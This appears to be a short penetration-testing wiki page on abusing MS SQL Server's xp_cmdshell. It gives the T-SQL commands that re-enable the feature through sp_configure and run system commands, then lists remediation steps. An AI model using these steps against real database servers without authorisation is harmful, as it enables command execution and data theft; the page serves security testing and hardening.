# MS SQL - xp\_cmdshell Abuse

The _xp\_cmdshell_ is a feature in MS SQL Server for executing system commands, which, if not properly configured, can be abused for achieving privilege escalation, RCE, or data theft.

Here is a guide on how to do this leveraging process once we are inside _MS SQL_:

* Check if _xp\_cmdshell_ is active by trying to execute a system command

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>EXEC xp_cmdshell 'whoami'; #Example
</strong></code></pre>

***

* In case its use is disabled, do the reconfiguration and try the execution again

{% code overflow="wrap" lineNumbers="true" %}
```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami'; #This should now work normally
```
{% endcode %}

## <mark style="color:blue;">Remediation Actions</mark> <a href="#preventing-nosql-injection" id="preventing-nosql-injection"></a>

* Disable _xp\_cmdshell_ if not specifically required for a critical business process
* Ensure that only trusted and minimal users are in the _sysadmin_ fixed server role, which allows enabling _xp\_cmdshell_
* Review SQL server logs for suspicious usage of _xp\_cmdshell_ or _sp\_configure_
* If it´s required to enable _xp\_cmdshell_, compensate with controls like isolating the server/network segment or monitoring all commands executed
